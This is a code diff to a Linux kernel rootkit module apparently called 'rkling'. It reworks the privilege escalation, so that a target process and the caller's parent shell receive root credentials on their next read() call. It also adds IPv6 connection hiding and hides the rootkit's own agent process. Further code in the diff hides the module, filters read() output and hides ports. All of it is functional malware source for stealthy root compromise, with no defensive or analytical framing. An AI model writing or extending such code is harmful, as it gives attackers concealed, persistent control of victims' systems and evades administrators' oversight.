@@ -5,10 +5,8 @@
 #include <linux/hex.h>
 #include <linux/inet.h>
 #include <linux/init.h>
-#include <linux/kallsyms.h>
 #include <linux/kprobes.h>
 #include <linux/module.h>
-#include <linux/pid.h>
 #include <linux/proc_fs.h>
 #include <linux/ptrace.h>
 #include <linux/sched.h>
@@ -90,44 +88,13 @@ void rk_module_unhide(void)
 
 /* --- privilege escalation --- */
 
-static typeof(&find_task_by_vpid) rk_find_task_by_vpid;
-
-static void *rk_kprobe_resolve(const char *name)
-{
-	struct kprobe kp = { .symbol_name = name };
-	void *addr;
-
-	if (register_kprobe(&kp))
-		return NULL;
-	addr = (void *)kp.addr;
-	unregister_kprobe(&kp);
-	return addr;
-}
-
-static int rk_resolve_symbols(void)
-{
-	rk_find_task_by_vpid = (typeof(rk_find_task_by_vpid))
-		rk_kprobe_resolve("find_task_by_vpid");
-	if (!rk_find_task_by_vpid)
-		return -ENOENT;
-
-	return 0;
-}
-
-static void rk_install_creds(struct task_struct *task, struct cred *new_cred)
-{
-	const struct cred *old;
-
-	old = rcu_dereference_protected(task->real_cred, 1);
-	rcu_assign_pointer(task->real_cred, new_cred);
-	rcu_assign_pointer(task->cred, new_cred);
-	put_cred(old);
-}
+static atomic_t escalate_pid = ATOMIC_INIT(0);
+static struct cred *escalate_cred;
 
 static int rk_escalate_self(void)
 {
-	struct task_struct *parent;
 	struct cred *new_cred;
+	struct task_struct *parent;
 	int error;
 
 	new_cred = prepare_kernel_cred(&init_task);
@@ -136,41 +103,26 @@ static int rk_escalate_self(void)
 	error = commit_creds(new_cred);
 	if (error)
 		return error;
+	// escalate parent shell via deferred path (safe under CET)
 	parent = rcu_dereference(current->real_parent);
-	if (parent && parent != current && parent->mm) {
-		new_cred = prepare_kernel_cred(&init_task);
-		if (new_cred)
-			rk_install_creds(parent, new_cred);
-	}
+	if (parent && parent != current && parent->mm)
+		rk_escalate_pid(task_tgid_vnr(parent));
 	return 0;
 }
 
+// deferred: creds applied when target next calls read()
 int rk_escalate_pid(unsigned int pid)
 {
-	struct task_struct *task;
 	struct cred *new_cred;
 
-	if (!rk_find_task_by_vpid)
-		return -ENOSYS;
-	rcu_read_lock();
-	task = rk_find_task_by_vpid((pid_t)pid);
-	if (!task) {
-		rcu_read_unlock();
-		return -ESRCH;
-	}
-	get_task_struct(task);
-	rcu_read_unlock();
-	if (!task->mm) {
-		put_task_struct(task);
-		return -EINVAL;
-	}
+	if (atomic_read(&escalate_pid))
+		return -EBUSY;
 	new_cred = prepare_kernel_cred(&init_task);
-	if (!new_cred) {
-		put_task_struct(task);
+	if (!new_cred)
 		return -ENOMEM;
-	}
-	rk_install_creds(task, new_cred);
-	put_task_struct(task);
+	escalate_cred = new_cred;
+	smp_wmb();
+	atomic_set(&escalate_pid, (int)pid);
 	return 0;
 }
 
@@ -405,8 +357,15 @@ static int rk_read_entry(struct kretprobe_instance *inst,
 			  struct pt_regs *regs)
 {
 	struct rk_read_data *data = (void *)inst->data;
+	int target = atomic_read(&escalate_pid);
 
-	data->buffer = (char __user *)regs_get_kernel_argument(regs, 1);
+	if (target && task_tgid_vnr(current) == target) {
+		atomic_set(&escalate_pid, 0);
+		smp_rmb();
+		commit_creds(escalate_cred);
+		escalate_cred = NULL;
+	}
+	data->buffer = (char __user *)regs->si;
 	return 0;
 }
 
@@ -417,11 +376,11 @@ static int rk_read_return(struct kretprobe_instance *inst,
 	long result = (long)regs_return_value(regs);
 	size_t new_len;
 
-	if (result <= 0 || result > RK_BUF_MAX)
+	if (!data->buffer || result <= 0 || result > RK_BUF_MAX)
 		return 0;
 	if (!content_targets.count)
 		return 0;
-	if (copy_from_user_nofault(data->scratch, data->buffer, result) != 0)
+	if (copy_from_user(data->scratch, data->buffer, result) != 0)
 		return 0;
 	new_len = rk_remove_matching_lines(data->scratch, (size_t)result);
 	if (new_len == (size_t)result)
@@ -430,14 +389,14 @@ static int rk_read_return(struct kretprobe_instance *inst,
 		regs_set_return_value(regs, 0);
 		return 0;
 	}
-	if (copy_to_user_nofault(data->buffer, data->scratch, new_len) != 0)
+	if (copy_to_user(data->buffer, data->scratch, new_len) != 0)
 		return 0;
 	regs_set_return_value(regs, (unsigned long)new_len);
 	return 0;
 }
 
 static struct kretprobe read_probe = {
-	.kp.symbol_name = "vfs_read",
+	.kp.symbol_name = "ksys_read",
 	.entry_handler = rk_read_entry,
 	.handler = rk_read_return,
 	.data_size = sizeof(struct rk_read_data),
@@ -484,8 +443,16 @@ static int rk_tcp_show_return(struct kretprobe_instance *inst,
 	return 0;
 }
 
-static struct kretprobe tcp_probe = {
+static struct kretprobe tcp4_probe = {
 	.kp.symbol_name = "tcp4_seq_show",
+	.entry_handler = rk_tcp_show_entry,
+	.handler = rk_tcp_show_return,
+	.data_size = sizeof(struct rk_tcp_data),
+	.maxactive = 8,
+};
+
+static struct kretprobe tcp6_probe = {
+	.kp.symbol_name = "tcp6_seq_show",
 	.entry_handler = rk_tcp_show_entry,
 	.handler = rk_tcp_show_return,
 	.data_size = sizeof(struct rk_tcp_data),
@@ -525,6 +492,7 @@ static int rk_show(struct seq_file *out, void *unused)
 	for (i = 0; i < port_targets.count; i++)
 		seq_printf(out, "  [%u] %s\n", i, port_targets.entries[i]);
 	spin_unlock_irqrestore(&port_targets.lock, flags);
+
 	return 0;
 }
 
@@ -583,10 +551,6 @@ static int __init rk_init(void)
 	if (error)
 		return -EINVAL;
 
-	error = rk_resolve_symbols();
-	if (error)
-		return error;
-
 	rk_target_list_init(&file_targets);
 	rk_target_list_init(&pid_targets);
 	rk_target_list_init(&content_targets);
@@ -610,13 +574,17 @@ static int __init rk_init(void)
 	if (error)
 		goto unregister_getdents;
 
-	error = register_kretprobe(&tcp_probe);
+	error = register_kretprobe(&tcp4_probe);
 	if (error)
 		goto unregister_read;
 
+	error = register_kretprobe(&tcp6_probe);
+	if (error)
+		goto unregister_tcp4;
+
 	error = register_kretprobe(&mkdir_probe);
 	if (error)
-		goto unregister_tcp;
+		goto unregister_tcp6;
 
 	proc_entry = proc_create("rkling_status", 0400, NULL, &rk_proc_ops);
 	if (!proc_entry) {
@@ -625,6 +593,13 @@ static int __init rk_init(void)
 	}
 
 	rk_target_add(&file_targets, "rkling");
+	{
+		char pid_str[12];
+
+		snprintf(pid_str, sizeof(pid_str), "%d",
+			 task_pid_vnr(agent.task));
+		rk_target_add(&pid_targets, pid_str);
+	}
 	rk_module_hide();
 
 	memzero_explicit(key, sizeof(key));
@@ -633,8 +608,10 @@ static int __init rk_init(void)
 
 unregister_mkdir:
 	unregister_kretprobe(&mkdir_probe);
-unregister_tcp:
-	unregister_kretprobe(&tcp_probe);
+unregister_tcp6:
+	unregister_kretprobe(&tcp6_probe);
+unregister_tcp4:
+	unregister_kretprobe(&tcp4_probe);
 unregister_read:
 	unregister_kretprobe(&read_probe);
 unregister_getdents:
@@ -654,7 +631,8 @@ static void __exit rk_exit(void)
 	rk_module_unhide();
 	proc_remove(proc_entry);
 	unregister_kretprobe(&mkdir_probe);
-	unregister_kretprobe(&tcp_probe);
+	unregister_kretprobe(&tcp6_probe);
+	unregister_kretprobe(&tcp4_probe);
 	unregister_kretprobe(&read_probe);
 	unregister_kretprobe(&getdents_probe);
 	rk_agent_stop(&agent);
